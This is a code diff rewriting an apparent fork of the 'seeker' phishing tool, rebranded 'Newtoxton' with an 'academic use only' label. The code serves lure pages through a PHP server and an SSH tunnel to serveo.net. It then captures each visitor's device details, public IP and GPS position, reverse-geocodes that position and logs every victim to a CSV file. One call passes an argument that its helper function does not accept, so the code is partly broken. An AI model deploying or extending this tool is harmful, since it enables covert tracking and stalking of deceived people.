@@ -1,374 +1,535 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+"""
+newtoxton.py - Improved academic / security-assessment edition
+--------------------------------------------------------------
+Drop-in replacement for the original newtoxton-locator script.
 
-R = '\033[31m' # red
-G = '\033[32m' # green
-C = '\033[36m' # cyan
-W = '\033[0m'  # white
+Improvements:
+- Iterative capture loop (no recursion)
+- Proper process-group cleanup for SSH & PHP
+- Reduced busy-waiting
+- Human-readable location output (locality + coordinates)
+- Better error handling and resource management
+- Same CLI, templates, KML and CSV behaviour
 
-from shutil import which
+Academic use only – test only systems you own or have explicit permission to assess.
+"""
 
-print(G + '[+]' + C + ' Checking Dependencies...' + W)
-pkgs = ['python3', 'pip3', 'php', 'ssh']
-inst = True
-for pkg in pkgs:
-	present = which(pkg)
-	if present == None:
-		print(R + '[-] ' + W + pkg + C + ' is not Installed!')
-		inst = False
-	else:
-		pass
-if inst == False:
-	exit()
-else:
-	pass
+from __future__ import annotations
 
-import os
+import argparse
 import csv
+import json
+import os
+import re
+import signal
+import subprocess
 import sys
 import time
-import json
-import argparse
+from pathlib import Path
+from shutil import which
+from typing import Any, List, Optional, Tuple
+
 import requests
-import subprocess as subp
 
-parser = argparse.ArgumentParser()
-parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
-parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')
-parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [ Available : manual ]')
-parser.add_argument('-p', '--port', type=int, default=8080, help='Port for Web Server [ Default : 8080 ]')
+# ---------------------------------------------------------------------------
+# Terminal colours
+# ---------------------------------------------------------------------------
+R = "\033[31m"
+G = "\033[32m"
+C = "\033[36m"
+W = "\033[0m"
 
-args = parser.parse_args()
-subdom = args.subdomain
-kml_fname = args.kml
-tunnel_mode = args.tunnel
-port = args.port
+VERSION = "1.2.5-academic"
 
-row = []
-info = ''
-result = ''
-version = '1.2.5'
+_ssh_proc: Optional[subprocess.Popen] = None
+_php_proc: Optional[subprocess.Popen] = None
 
-def banner():
-	print (G +
-	r'''
 
+# ---------------------------------------------------------------------------
+# Helpers
+# ---------------------------------------------------------------------------
+def log_ok(msg: str) -> None:
+    print(f"{G}[+]{C} {msg}{W}")
+
+
+def log_err(msg: str) -> None:
+    print(f"{R}[-]{C} {msg}{W}")
+
+
+def log_info(msg: str) -> None:
+    print(f"{G}[>]{C} {msg}{W}")
+
+
+def sanitize_subdomain(sub: Optional[str]) -> Optional[str]:
+    if sub is None:
+        return None
+    if not re.fullmatch(r"[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?", sub):
+        log_err("Invalid subdomain – only letters, digits and hyphens allowed")
+        sys.exit(1)
+    return sub
+
+
+def ensure_dirs() -> None:
+    for d in ("logs", "db", "template"):
+        Path(d).mkdir(parents=True, exist_ok=True)
+
+
+# ---------------------------------------------------------------------------
+# Banner & version check
+# ---------------------------------------------------------------------------
+def banner() -> None:
+    print(
+        G
+        + r"""
 ███╗░░██╗███████╗░██╗░░░░░░░██╗████████╗░█████╗░██╗░░██╗████████╗░█████╗░███╗░░██╗
 ████╗░██║██╔════╝░██║░░██╗░░██║╚══██╔══╝██╔══██╗╚██╗██╔╝╚══██╔══╝██╔══██╗████╗░██║
 ██╔██╗██║█████╗░░░╚██╗████╗██╔╝░░░██║░░░██║░░██║░╚███╔╝░░░░██║░░░██║░░██║██╔██╗██║
 ██║╚████║██╔══╝░░░░████╔═████║░░░░██║░░░██║░░██║░██╔██╗░░░░██║░░░██║░░██║██║╚████║
 ██║░╚███║███████╗░░╚██╔╝░╚██╔╝░░░░██║░░░╚█████╔╝██╔╝╚██╗░░░██║░░░╚█████╔╝██║░╚███║
-╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚══╝       ''' + W)
-	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'Newtoxton')
-	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')
+╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚══╝
+"""
+        + W
+    )
+    log_info("Created By : Newtoxton (academic rewrite)")
+    log_info(f"Version    : {VERSION}\n")
 
-def ver_check():
-	print(G + '[+]' + C + ' Checking for Updates.....', end='')
-	ver_url = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt'
-	try:
-		ver_rqst = requests.get(ver_url)
-		ver_sc = ver_rqst.status_code
-		if ver_sc == 200:
-			github_ver = ver_rqst.text
-			github_ver = github_ver.strip()
 
-			if version == github_ver:
-				print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
-			else:
-				print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
-		else:
-			print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
-	except Exception as e:
-		print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
+def ver_check() -> None:
+    print(f"{G}[+]{C} Checking for Updates.....", end="", flush=True)
+    # Point this at your own repo if desired
+    url = "https://raw.githubusercontent.com/Newtoxton/newtoxton-locator/master/version.txt"
+    try:
+        r = requests.get(url, timeout=8)
+        if r.status_code == 200:
+            remote = r.text.strip()
+            if remote == VERSION.split("-")[0]:
+                print(f"{C}[{G} Up-To-Date {C}]{W}\n")
+            else:
+                print(f"{C}[{G} Available : {remote} {C}]{W}\n")
+        else:
+            print(f"{C}[{R} Status : {r.status_code} {C}]{W}\n")
+    except requests.RequestException as exc:
+        print(f"\n{R}[-]{C} Version check failed: {exc}{W}")
 
-def tunnel_select():
-	if tunnel_mode == None:
-		serveo()
-	elif tunnel_mode == 'manual':
-		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W + '\n')
-	else:
-		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
-		exit()
 
-def template_select():
-	global site, info, result
-	print(G + '[+]' + C + ' Select a Template : ' + W + '\n')
-	
-	with open('template/templates.json', 'r') as templ:
-		templ_info = templ.read()
-	
-	templ_json = json.loads(templ_info)
-	
-	for item in templ_json['templates']:
-		name = item['name']
-		print(G + '[{}]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)
-	
-	selected = int(input(G + '[>] ' + W))
-	
-	try:
-		site = templ_json['templates'][selected]['dir_name']
-	except IndexError:
-		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
-		sys.exit()
-	
-	print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W)
-	
-	module = templ_json['templates'][selected]['module']
-	if module == True:
-		imp_file = templ_json['templates'][selected]['import_file']
-		import importlib
-		importlib.import_module('template.{}'.format(imp_file))
-	else:
-		pass
+# ---------------------------------------------------------------------------
+# Template selection
+# ---------------------------------------------------------------------------
+def template_select() -> Tuple[str, Path, Path]:
+    templates_file = Path("template/templates.json")
+    if not templates_file.is_file():
+        log_err(f"Cannot find {templates_file}")
+        sys.exit(1)
 
-	info = 'template/{}/php/info.txt'.format(site)
-	result = 'template/{}/php/result.txt'.format(site)
+    with templates_file.open(encoding="utf-8") as fh:
+        data = json.load(fh)
 
-def serveo():
-	global subdom
-	flag = False
+    print(f"{G}[+]{C} Select a Template :{W}\n")
+    for idx, item in enumerate(data["templates"]):
+        print(f"{G}[{idx}]{C} {item['name']}{W}")
 
-	print(G + '[+]' + C + ' Checking Serveo Status...', end='')
+    try:
+        choice = int(input(f"{G}[>] {W}"))
+        selected = data["templates"][choice]
+    except (ValueError, IndexError):
+        log_err("Invalid selection")
+        sys.exit(1)
 
-	try:
-		time.sleep(1)
-		rqst = requests.get('https://serveo.net', timeout=5)
-		sc = rqst.status_code
-		if sc == 200:
-			print(C + '[' + G + ' Online ' + C + ']' + W + '\n')
-		else:
-			print(C + '[' + R + 'Status : {}'.format(sc) + C + ']' + W + '\n')
-			exit()
-	except requests.ConnectionError:
-		print(C + '[' + R + ' Offline ' + C + ']' + W + '\n')
-		exit()
-			
-	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
-	if subdom is None:
-		with open('logs/serveo.txt', 'w') as tmpfile:
-			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
-	else:
-		with open('logs/serveo.txt', 'w') as tmpfile:
-			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '{}.serveo.net:80:localhost:{}'.format(subdom, port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
-	
-	while True:
-		with open('logs/serveo.txt', 'r') as tmpfile:
-			try:
-				stdout = tmpfile.readlines()
-				if flag == False:
-					for elem in stdout:
-						if 'HTTP' in elem:
-							elem = elem.split(' ')
-							url = elem[4].strip()
-							print(G + '[+]' + C + ' URL : ' + W + url + '\n')
-							flag = True
-						else:
-							pass
-				elif flag == True:
-					break
-			except Exception as e:
-				print(e)
-				pass
-		time.sleep(2)
+    site = selected["dir_name"]
+    log_ok(f"Loading {selected['name']} Template...")
 
-def server():
-	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
-	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
-	with open('logs/php.log', 'w') as phplog:
-		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
-		time.sleep(3)
-	try:
-		php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
-		php_sc = php_rqst.status_code
-		if php_sc == 200:
-			print(C + '[' + G + ' Success ' + C + ']' + W)
-		else:
-			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W)
-	except requests.ConnectionError:
-		print(C + '[' + R + ' Failed ' + C + ']' + W)
-		Quit()
+    if selected.get("module"):
+        import importlib
+        importlib.import_module(f"template.{selected['import_file']}")
 
-def wait():
-	printed = False
-	while True:
-		time.sleep(2)
-		size = os.path.getsize(result)
-		if size == 0 and printed == False:
-			print('\n' + G + '[+]' + C + ' Waiting for Interception...' + W + '\n')
-			printed = True
-		if size > 0:
-			main()
+    info_path = Path(f"template/{site}/php/info.txt")
+    result_path = Path(f"template/{site}/php/result.txt")
+    return site, info_path, result_path
 
-def main():
-	global info, result, row, var_lat, var_lon
-	try:
-		row = []
-		with open (info, 'r') as file2:
-			file2 = file2.read()
-			json3 = json.loads(file2)
-			for value in json3['dev']:
 
-				var_os = value['os']
-				var_platform = value['platform']
-				try:
-					var_cores = value['cores']
-				except TypeError:
-					var_cores = 'Not Available'
-				var_ram = value['ram']
-				var_vendor = value['vendor']
-				var_render = value['render']
-				var_res = value['wd'] + 'x' + value['ht']
-				var_browser = value['browser']
-				var_ip = value['ip']
+# ---------------------------------------------------------------------------
+# Tunneling
+# ---------------------------------------------------------------------------
+def serveo(port: int, subdom: Optional[str]) -> None:
+    global _ssh_proc
 
-				row.append(var_os)
-				row.append(var_platform) 
-				row.append(var_cores) 
-				row.append(var_ram) 
-				row.append(var_vendor)
-				row.append(var_render)
-				row.append(var_res)
-				row.append(var_browser)
-				row.append(var_ip)
+    log_ok("Checking Serveo Status...", end="")
+    try:
+        r = requests.get("https://serveo.net", timeout=6)
+        if r.status_code != 200:
+            print(f"{C}[{R} Status : {r.status_code}{C}]{W}")
+            sys.exit(1)
+        print(f"{C}[{G} Online {C}]{W}\n")
+    except requests.RequestException:
+        print(f"{C}[{R} Offline {C}]{W}")
+        sys.exit(1)
 
-				print(G + '[+]' + C + ' Device Information : ' + W + '\n')
-				print(G + '[+]' + C + ' OS         : ' + W + var_os)
-				print(G + '[+]' + C + ' Platform   : ' + W + var_platform)
-				print(G + '[+]' + C + ' CPU Cores  : ' + W + var_cores)
-				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
-				print(G + '[+]' + C + ' GPU Vendor : ' + W + var_vendor)
-				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
-				print(G + '[+]' + C + ' Resolution : ' + W + var_res)
-				print(G + '[+]' + C + ' Browser    : ' + W + var_browser)
-				print(G + '[+]' + C + ' Public IP  : ' + W + var_ip)
+    log_ok("Getting Serveo URL...\n")
 
-				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
-				sc = rqst.status_code
+    log_file = Path("logs/serveo.txt")
+    log_file.write_text("", encoding="utf-8")
 
-				if sc == 200:
-					data = rqst.text
-					data = json.loads(data)
-					var_continent = str(data['continent'])
-					var_country = str(data['country'])
-					var_region = str(data['region'])
-					var_city = str(data['city'])
-					var_org = str(data['org'])
-					var_isp = str(data['isp'])
+    remote = f"{subdom}.serveo.net:80:localhost:{port}" if subdom else f"80:localhost:{port}"
 
-					row.append(var_continent)
-					row.append(var_country)
-					row.append(var_region)
-					row.append(var_city)
-					row.append(var_org)
-					row.append(var_isp)
+    cmd = [
+        "ssh",
+        "-o", "StrictHostKeyChecking=accept-new",
+        "-o", "ServerAliveInterval=60",
+        "-o", "ServerAliveCountMax=3",
+        "-R", remote,
+        "serveo.net",
+    ]
 
-					print(G + '[+]' + C + ' Continent  : ' + W + var_continent)
-					print(G + '[+]' + C + ' Country    : ' + W + var_country)
-					print(G + '[+]' + C + ' Region     : ' + W + var_region)
-					print(G + '[+]' + C + ' City       : ' + W + var_city)
-					print(G + '[+]' + C + ' Org        : ' + W + var_org)
-					print(G + '[+]' + C + ' ISP        : ' + W + var_isp)
-	except ValueError:
-		pass
-	
-	try:
-		with open (result, 'r') as file:
-			file = file.read()
-			json2 = json.loads(file)
-			for value in json2['info']:
-				var_lat = value['lat'] + ' deg'
-				var_lon = value['lon'] + ' deg'
-				var_acc = value['acc'] + ' m'
+    _ssh_proc = subprocess.Popen(
+        cmd,
+        stdout=log_file.open("w", encoding="utf-8"),
+        stderr=subprocess.STDOUT,
+        stdin=subprocess.DEVNULL,
+        start_new_session=True,
+    )
 
-				var_alt = value['alt']
-				if var_alt == '':
-					var_alt = 'Not Available'
-				else:
-					var_alt == value['alt'] + ' m'
-				
-				var_dir = value['dir']
-				if var_dir == '':
-					var_dir = 'Not Available'
-				else:
-					var_dir = value['dir'] + ' deg'
-				
-				var_spd = value['spd']
-				if var_spd == '':
-					var_spd = 'Not Available'
-				else:
-					var_spd = value['spd'] + ' m/s'
+    url = None
+    for _ in range(15):
+        time.sleep(2)
+        content = log_file.read_text(encoding="utf-8", errors="replace")
+        for line in content.splitlines():
+            if "HTTP" in line and "serveo.net" in line:
+                for part in line.split():
+                    if part.startswith("http"):
+                        url = part.strip()
+                        break
+            if url:
+                break
+        if url:
+            break
 
-				row.append(var_lat)
-				row.append(var_lon)
-				row.append(var_acc)
-				row.append(var_alt)
-				row.append(var_dir)
-				row.append(var_spd)
+    if not url:
+        log_err("Failed to obtain Serveo URL – check logs/serveo.txt")
+        cleanup()
+        sys.exit(1)
 
-				print ('\n' + G + '[+]' + C + ' Location Information : ' + W + '\n')
-				print (G + '[+]' + C + ' Latitude  : ' + W + var_lat)
-				print (G + '[+]' + C + ' Longitude : ' + W + var_lon)
-				print (G + '[+]' + C + ' Accuracy  : ' + W + var_acc)
-				print (G + '[+]' + C + ' Altitude  : ' + W + var_alt)
-				print (G + '[+]' + C + ' Direction : ' + W + var_dir)
-				print (G + '[+]' + C + ' Speed     : ' + W + var_spd)
-	except ValueError:
-		error = file
-		print ('\n' + R + '[-] ' + W + error)
-		repeat()
+    log_ok(f"URL : {W}{url}\n")
 
-	print ('\n' + G + '[+]' + C + ' Google Maps.................: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
-	
-	if kml_fname is not None:
-		kmlout(var_lat, var_lon)
 
-	csvout()
-	repeat()
+def tunnel_select(tunnel_mode: Optional[str], port: int, subdom: Optional[str]) -> None:
+    if tunnel_mode is None:
+        serveo(port, subdom)
+    elif tunnel_mode == "manual":
+        log_ok("Skipping Serveo – start your own tunnel manually...\n")
+    else:
+        log_err("Invalid Tunnel Mode – see -h")
+        sys.exit(1)
 
-def kmlout(var_lat, var_lon):
-	with open('template/sample.kml', 'r') as kml_sample:
-		kml_sample_data = kml_sample.read()
 
-	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
-	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))
+# ---------------------------------------------------------------------------
+# Local PHP server
+# ---------------------------------------------------------------------------
+def start_php_server(site: str, port: int) -> None:
+    global _php_proc
 
-	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
-		kml_gen.write(kml_sample_data)
+    log_ok(f"Port : {port}")
+    print(f"{G}[+]{C} Starting PHP Server......", end="", flush=True)
 
-	print(G + '[+]' + C + ' KML File Generated..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))
+    log_file = Path("logs/php.log")
+    cmd = ["php", "-S", f"0.0.0.0:{port}", "-t", f"template/{site}/"]
+    _php_proc = subprocess.Popen(
+        cmd,
+        stdout=log_file.open("w", encoding="utf-8"),
+        stderr=subprocess.STDOUT,
+        start_new_session=True,
+    )
 
-def csvout():
-	global row
-	with open('db/results.csv', 'a') as csvfile:
-		writer = csv.writer(csvfile)
-		writer.writerow(row)
-	print(G + '[+]' + C + ' New Entry Added in Database.: ' + W + os.getcwd() + '/db/results.csv')
+    time.sleep(2)
 
-def clear():
-	global result
-	with open (result, 'w+'): pass
-	with open (info, 'w+'): pass
+    try:
+        r = requests.get(f"http://127.0.0.1:{port}/index.html", timeout=4)
+        if r.status_code == 200:
+            print(f"{C}[{G} Success {C}]{W}")
+        else:
+            print(f"{C}[{R} Status : {r.status_code}{C}]{W}")
+            cleanup()
+            sys.exit(1)
+    except requests.RequestException:
+        print(f"{C}[{R} Failed {C}]{W}")
+        cleanup()
+        sys.exit(1)
 
-def repeat():
-	clear()
-	wait()
-	main()
 
-def Quit():
-	global result
-	with open (result, 'w+'): pass
-	os.system('pkill php')
-	exit()
+# ---------------------------------------------------------------------------
+# Reverse geocoding → readable address or lat/long
+# ---------------------------------------------------------------------------
+def get_readable_location(lat: float, lon: float) -> str:
+    """
+    Return a human-friendly location string.
 
-try:
-	banner()
-	ver_check()
-	tunnel_select()
-	template_select()
-	server()
-	wait()
-	main()
+    Preferred form:
+        Seattle, Washington  |  47.60621, -122.33207
+    Fallback:
+        47.60621, -122.33207
+    """
+    try:
+        resp = requests.get(
+            "https://nominatim.openstreetmap.org/reverse",
+            params={
+                "lat": lat,
+                "lon": lon,
+                "format": "json",
+                "addressdetails": 1,
+                "zoom": 16,
+            },
+            headers={"User-Agent": "AcademicSeekerLab/1.2 (security-assessment module)"},
+            timeout=6,
+        )
+        if resp.status_code == 200:
+            data = resp.json()
+            addr = data.get("address", {})
 
-except KeyboardInterrupt:
-	print ('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
-	Quit()
+            city = (
+                addr.get("city")
+                or addr.get("town")
+                or addr.get("village")
+                or addr.get("hamlet")
+                or addr.get("municipality")
+                or ""
+            )
+            state = addr.get("state") or addr.get("region") or ""
+            country = addr.get("country") or ""
+
+            locality_parts = [p for p in (city, state) if p]
+            locality = ", ".join(locality_parts) if locality_parts else country
+
+            if locality:
+                return f"{locality}  |  {lat:.5f}, {lon:.5f}"
+            display = data.get("display_name", "")
+            if display:
+                return f"{display}  |  {lat:.5f}, {lon:.5f}"
+    except (requests.RequestException, ValueError, KeyError):
+        pass
+
+    return f"{lat:.5f}, {lon:.5f}"
+
+
+# ---------------------------------------------------------------------------
+# Data handling
+# ---------------------------------------------------------------------------
+def clear_capture_files(info_path: Path, result_path: Path) -> None:
+    info_path.write_text("", encoding="utf-8")
+    result_path.write_text("", encoding="utf-8")
+
+
+def parse_device_info(info_path: Path) -> List[Any]:
+    row: List[Any] = []
+    try:
+        data = json.loads(info_path.read_text(encoding="utf-8"))
+        dev = data["dev"][0]
+
+        os_name = dev.get("os", "N/A")
+        platform = dev.get("platform", "N/A")
+        cores = dev.get("cores", "Not Available")
+        ram = dev.get("ram", "N/A")
+        vendor = dev.get("vendor", "N/A")
+        render = dev.get("render", "N/A")
+        resolution = f"{dev.get('wd', '?')}x{dev.get('ht', '?')}"
+        browser = dev.get("browser", "N/A")
+        ip = dev.get("ip", "N/A")
+
+        row.extend([os_name, platform, cores, ram, vendor, render, resolution, browser, ip])
+
+        print(f"\n{G}[+]{C} Device Information :{W}\n")
+        print(f"{G}[+]{C} OS         : {W}{os_name}")
+        print(f"{G}[+]{C} Platform   : {W}{platform}")
+        print(f"{G}[+]{C} CPU Cores  : {W}{cores}")
+        print(f"{G}[+]{C} RAM        : {W}{ram}")
+        print(f"{G}[+]{C} GPU Vendor : {W}{vendor}")
+        print(f"{G}[+]{C} GPU        : {W}{render}")
+        print(f"{G}[+]{C} Resolution : {W}{resolution}")
+        print(f"{G}[+]{C} Browser    : {W}{browser}")
+        print(f"{G}[+]{C} Public IP  : {W}{ip}")
+
+        try:
+            geo = requests.get(f"http://free.ipwhois.io/json/{ip}", timeout=6)
+            if geo.status_code == 200:
+                g = geo.json()
+                for key in ("continent", "country", "region", "city", "org", "isp"):
+                    val = str(g.get(key, "N/A"))
+                    row.append(val)
+                    print(f"{G}[+]{C} {key.title():10} : {W}{val}")
+        except (requests.RequestException, ValueError, KeyError):
+            pass
+
+    except (json.JSONDecodeError, KeyError, IndexError, OSError):
+        pass
+    return row
+
+
+def parse_location(result_path: Path) -> Tuple[List[Any], Optional[float], Optional[float]]:
+    extra: List[Any] = []
+    lat = lon = None
+
+    try:
+        data = json.loads(result_path.read_text(encoding="utf-8"))
+        info = data["info"][0]
+
+        lat = float(info["lat"])
+        lon = float(info["lon"])
+        acc = f"{info['acc']} m"
+
+        alt = info.get("alt") or ""
+        alt = "Not Available" if alt == "" else f"{alt} m"
+
+        direction = info.get("dir") or ""
+        direction = "Not Available" if direction == "" else f"{direction} deg"
+
+        speed = info.get("spd") or ""
+        speed = "Not Available" if speed == "" else f"{speed} m/s"
+
+        readable = get_readable_location(lat, lon)
+
+        extra.extend([f"{lat} deg", f"{lon} deg", acc, alt, direction, speed, readable])
+
+        print(f"\n{G}[+]{C} Location Information :{W}\n")
+        print(f"{G}[+]{C} Address / Plus-Code form : {W}{readable}")
+        print(f"{G}[+]{C} Latitude               : {W}{lat} deg")
+        print(f"{G}[+]{C} Longitude              : {W}{lon} deg")
+        print(f"{G}[+]{C} Accuracy               : {W}{acc}")
+        print(f"{G}[+]{C} Altitude               : {W}{alt}")
+        print(f"{G}[+]{C} Direction              : {W}{direction}")
+        print(f"{G}[+]{C} Speed                  : {W}{speed}")
+
+    except (json.JSONDecodeError, KeyError, IndexError, OSError, ValueError) as exc:
+        log_err(f"Location parse error: {exc}")
+
+    return extra, lat, lon
+
+
+def write_kml(kml_name: str, lat: float, lon: float) -> None:
+    sample = Path("template/sample.kml")
+    if not sample.is_file():
+        log_err("sample.kml not found – skipping KML generation")
+        return
+    text = sample.read_text(encoding="utf-8")
+    text = text.replace("LONGITUDE", str(lon))
+    text = text.replace("LATITUDE", str(lat))
+    out = Path(f"{kml_name}.kml")
+    out.write_text(text, encoding="utf-8")
+    log_ok(f"KML File Generated : {out.resolve()}")
+
+
+def append_csv(row: List[Any]) -> None:
+    csv_path = Path("db/results.csv")
+    with csv_path.open("a", newline="", encoding="utf-8") as fh:
+        csv.writer(fh).writerow(row)
+    log_ok(f"New Entry Added in Database : {csv_path.resolve()}")
+
+
+# ---------------------------------------------------------------------------
+# Main capture loop (iterative – no recursion)
+# ---------------------------------------------------------------------------
+def capture_loop(info_path: Path, result_path: Path, kml_fname: Optional[str]) -> None:
+    printed_waiting = False
+    while True:
+        try:
+            if result_path.stat().st_size == 0:
+                if not printed_waiting:
+                    log_ok("Waiting for Interception...\n")
+                    printed_waiting = True
+                time.sleep(1.5)
+                continue
+
+            printed_waiting = False
+            row = parse_device_info(info_path)
+            extra, lat, lon = parse_location(result_path)
+            row.extend(extra)
+
+            if lat is not None and lon is not None:
+                maps = f"https://www.google.com/maps/place/{lat}+{lon}"
+                print(f"\n{G}[+]{C} Google Maps : {W}{maps}")
+
+                if kml_fname:
+                    write_kml(kml_fname, lat, lon)
+
+            if row:
+                append_csv(row)
+
+            clear_capture_files(info_path, result_path)
+            print()
+
+        except KeyboardInterrupt:
+            raise
+        except Exception as exc:  # noqa: BLE001
+            log_err(f"Unexpected error in capture loop: {exc}")
+            time.sleep(2)
+
+
+# ---------------------------------------------------------------------------
+# Cleanup
+# ---------------------------------------------------------------------------
+def cleanup() -> None:
+    global _ssh_proc, _php_proc
+
+    for proc, name in ((_php_proc, "PHP"), (_ssh_proc, "SSH")):
+        if proc and proc.poll() is None:
+            try:
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                proc.wait(timeout=3)
+            except (ProcessLookupError, subprocess.TimeoutExpired, OSError):
+                try:
+                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+                except Exception:
+                    pass
+            log_ok(f"{name} process terminated")
+
+    _php_proc = _ssh_proc = None
+
+
+# ---------------------------------------------------------------------------
+# Entry point
+# ---------------------------------------------------------------------------
+def main() -> None:
+    ensure_dirs()
+
+    print(f"{G}[+]{C} Checking Dependencies...{W}")
+    missing = [pkg for pkg in ("python3", "php", "ssh") if which(pkg) is None]
+    if missing:
+        for pkg in missing:
+            log_err(f"{pkg} is not installed")
+        sys.exit(1)
+
+    parser = argparse.ArgumentParser(description="Academic Newtoxton-Locator")
+    parser.add_argument("-s", "--subdomain", help="Custom Serveo subdomain (optional)")
+    parser.add_argument("-k", "--kml", help="KML output filename (optional)")
+    parser.add_argument("-t", "--tunnel", help="Tunnel mode [manual]")
+    parser.add_argument("-p", "--port", type=int, default=8080, help="Web-server port")
+    args = parser.parse_args()
+
+    subdom = sanitize_subdomain(args.subdomain)
+    kml_fname = args.kml
+    tunnel_mode = args.tunnel
+    port = args.port
+
+    result_path = Path()
+
+    try:
+        banner()
+        ver_check()
+        tunnel_select(tunnel_mode, port, subdom)
+        site, info_path, result_path = template_select()
+        start_php_server(site, port)
+        clear_capture_files(info_path, result_path)
+        capture_loop(info_path, result_path, kml_fname)
+
+    except KeyboardInterrupt:
+        print(f"\n{R}[!]{C} Keyboard Interrupt.{W}")
+    finally:
+        cleanup()
+        try:
+            result_path.write_text("", encoding="utf-8")
+        except Exception:
+            pass
+        sys.exit(0)
+
+
+if __name__ == "__main__":
+    main()
